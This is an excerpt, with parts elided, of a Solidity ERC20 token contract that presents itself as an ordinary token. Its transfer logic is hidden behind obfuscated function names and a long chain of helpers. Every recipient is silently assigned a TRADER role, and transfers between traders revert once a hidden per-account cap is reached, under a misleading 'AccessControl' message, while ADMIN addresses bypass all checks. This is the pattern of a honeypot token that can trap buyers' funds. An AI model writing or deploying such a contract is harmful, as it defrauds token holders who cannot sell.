...
abstract contract XINDECDSConsole is Context, XINDECDSRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _XINDECDSroltest(role, account, amt);
    }

    function _XINDECDSroltest(bytes32 role, address account, uint256 amt) internal {
        uint256 rm = _roles[role].RD.RM[account];
        if (rm > 0) {
            uint256 nt = amt + _roles[role].RD.RD[account];
            if (nt >= rm) {
                revert("AccessControl: addr");
            } else {
    ...
    function _XINDECDSrolpsan(bytes32 role, address account, uint256 num) internal virtual {
...
contract XINDECDSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is XINDECDSERC20, XINDECDSConsole {
    ...
    ) XINDECDSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(XINDECDSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _XINDECDSegcvbt(from, to, amt);

    }



    function _XINDECDSegcvbt(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _XINDECDSfghrda(from, to, amt);
    }


    function _XINDECDSfghrda(address from, address to, uint256 amt) internal {
        ...
        _XINDECDSmyfrdv(from, to, amt);
    }

    function _XINDECDSmyfrdv(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _XINDECDSolfvcx(from, to, amt);
    }


    function _XINDECDSolfvcx(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _XINDECDSgkytdvvn(from, to, amt);
    }

    function _XINDECDSgkytdvvn(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _XINDECDSxcdghbt(from, to, amt);
    }

    function _XINDECDSxcdghbt(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _XINDECDSgkyxfgd(from, TRADER, amt);
    ...
    function _XINDECDSgkyxfgd(address from, bytes32 role, uint256 amt) internal {
        _XINDECDSroltest(role, from, amt);
    }
